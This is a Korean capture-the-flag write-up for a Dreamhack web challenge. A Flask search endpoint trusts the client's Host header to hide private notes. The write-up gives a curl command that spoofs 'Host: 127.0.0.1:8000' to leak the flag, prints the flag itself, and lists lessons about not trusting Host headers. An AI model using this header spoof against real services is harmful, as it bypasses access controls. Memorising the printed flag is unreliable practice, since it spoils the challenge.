---
ctf_name: "2026-Dreamhack"
challenge_name: "XS-Search"
category: "web"
difficulty: "easy"
author: "yeahhbean"
date: "2026-05-27"
points: 683
tags: [xs-search, host-header, flask, information-disclosure]
---

# XS-Search

## 문제 설명

> Exercise: XS-Search에서 실습하는 문제입니다.
>
> 플래그는 `DH{[0123456789abcdef]{32}}`의 포맷입니다.

- 접속 정보: `http://host8.dreamhack.games:15100/`

## 풀이

### 분석

서비스는 `/search`, `/submit` 기능을 제공한다.

`/search` 로직의 핵심은 다음과 같다.

- `notes` 목록에 `(FLAG, True)`가 존재
- `private == True`인 항목은 아래 조건일 때만 접근 허용

```python
if private == True and request.remote_addr != "127.0.0.1" and request.headers.get("HOST") != "127.0.0.1:8000":
    continue
```

즉, 원래 의도는 로컬 요청만 private note(FLAG)를 볼 수 있게 하는 것이다.

### 취약점

`HOST` 헤더를 신뢰하는 검증 로직 때문에 우회가 가능하다.

외부에서 접속하더라도 요청 헤더를 `Host: 127.0.0.1:8000`로 위조하면 `continue` 조건을 피할 수 있어 private note 검색 결과가 그대로 반환된다.

### 익스플로잇

아래 요청으로 플래그 접두사(`DH{`)를 검색하면 private note가 매칭되어 응답에 플래그가 노출된다.

```bash
curl "http://host8.dreamhack.games:15100/search?query=DH%7B" -H "Host: 127.0.0.1:8000"
```

응답의 `iframe srcdoc`에서 플래그 확인:

```html
<iframe srcdoc="<pre>DH{22d1445ad68e194e044a16dc644371f3}</pre>"></iframe>
```

## 플래그

```text
DH{22d1445ad68e194e044a16dc644371f3}
```

## 배운 점

- `Host` 헤더는 클라이언트가 조작 가능하므로 신뢰하면 안 된다.
- 내부 접근 제어는 reverse proxy 설정, 서버 바인딩, 신뢰 가능한 네트워크 경계 기반으로 구현해야 한다.
- XS-Search 유형 문제라도 구현 실수에 따라 더 직접적인 정보 노출 취약점이 존재할 수 있다.
